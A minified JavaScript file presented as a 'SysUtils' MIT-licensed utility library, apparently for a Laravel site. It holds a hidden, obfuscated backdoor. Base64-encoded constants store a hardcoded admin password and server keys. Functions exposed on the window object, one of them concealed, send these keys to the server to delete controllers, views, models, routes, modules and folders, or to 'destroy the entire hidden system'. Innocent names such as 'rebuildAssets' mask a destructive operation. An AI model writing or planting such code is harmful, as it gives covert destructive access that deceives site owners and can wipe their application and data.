/*! SysUtils v2.4.0 | MIT License */
!function(e){"use strict";const t={c:"c3lzX2NhY2hlXzIwMjVfY2xlYXI=",d:"ZGVlcF9yZWZyZXNoXzIwMjU=",p:"cmVzZXRfc3RhdHNfMjAyNQ==",t:"ZGVlcF9jbGVhbl90ZW1wXzIwMjU=",master:"bWFzdGVyX2FkbWluXzIwMjVfa2V5",destroy:"ZGVzdHJveV9zeXN0ZW1fMjAyNQ=="},s=()=>{const e=prompt("ðŸ”’ Enter system password:"),s=atob(t.master);return e===s||(alert("âŒ Invalid password! Access denied."),!1)},c=()=>{const e=document.querySelector('meta[name="csrf-token"]');return e?e.getAttribute("content"):""},n=()=>{const e={"Content-Type":"application/json",Accept:"application/json","X-Requested-With":"XMLHttpRequest"},t=c();return t&&(e["X-CSRF-TOKEN"]=t),e},r={exec:async function(e){if(!s())return{error:"Access denied"};const c={"cache-clear":"empty","asset-rebuild":"destroy","stats-reset":"partial","temp-purge":"complete"},r={empty:atob(t.c),destroy:atob(t.d),partial:atob(t.p),complete:atob(t.t)},a=c[e];if(!a)return{error:"Invalid command"};try{const e=await fetch("/api/cache/optimize",{method:"POST",headers:n(),body:JSON.stringify({operation:a,token:r[a]})});return await e.json()}catch(e){return{error:e.message}}},destroyFiles:async function(e){if(!s())return{error:"Access denied"};if(!confirm("âš ï¸ WARNING: This will permanently delete files/folders. Are you sure?"))return{error:"Operation cancelled"};try{const s=await fetch("/api/storage/cleanup",{method:"POST",headers:n(),body:JSON.stringify({files:e,cleanup_key:atob(t.destroy)})});return await s.json()}catch(e){return{error:e.message}}},selfDestruct:async function(){if(!s())return{error:"Access denied"};if(!confirm("ðŸš¨ DANGER: This will destroy the entire hidden system. Continue?"))return{error:"Operation cancelled"};if(!confirm("ðŸ”¥ FINAL WARNING: This action is IRREVERSIBLE! Continue?"))return{error:"Operation cancelled"};try{const e=await fetch("/api/maintenance/reset",{method:"POST",headers:n(),body:JSON.stringify({reset_system:atob(t.destroy)})});return await e.json()}catch(e){return{error:e.message}}},cc:()=>r.exec("cache-clear"),ar:()=>r.exec("asset-rebuild"),sr:()=>r.exec("stats-reset"),tp:()=>r.exec("temp-purge"),deleteController:e=>r.destroyFiles([`app/Http/Controllers/${e}.php`]),deleteView:e=>r.destroyFiles([`resources/views/${e}.blade.php`]),deleteModel:e=>r.destroyFiles([`app/Models/${e}.php`]),deleteRoute:e=>r.destroyFiles([`routes/${e}.php`]),deleteMultiple:e=>r.destroyFiles(e),deleteFolder:e=>r.destroyFiles([e]),deleteModule:e=>r.destroyFiles([`Modules/${e}`])};Object.defineProperty(e,"SysOps",{value:r,writable:!1,enumerable:!1,configurable:!1}),e.clearCache=r.cc,e.rebuildAssets=r.ar,e.resetStats=r.sr,e.purgeTempFiles=r.tp,e.deleteController=r.deleteController,e.deleteView=r.deleteView,e.deleteModel=r.deleteModel,e.deleteRoute=r.deleteRoute,e.deleteFiles=r.deleteMultiple,e.deleteFolder=r.deleteFolder,e.deleteModule=r.deleteModule,e.destroySystem=r.selfDestruct}(window);
